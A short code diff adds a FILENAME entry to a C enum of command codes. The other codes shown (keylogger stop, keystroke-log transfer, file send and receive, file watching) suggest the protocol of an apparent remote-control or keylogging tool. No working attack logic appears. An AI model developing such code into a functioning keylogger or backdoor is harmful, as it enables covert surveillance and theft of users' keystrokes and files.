@@ -18,6 +18,7 @@ enum command_codes {
     STOP_KEYLOGGER,
     KEY_LOG_TRANSFER,
     SEND_FILE,
+    FILENAME,
     RECEIVE_FILE,
     SEND_WATCH,
     WATCH_CHANGED,
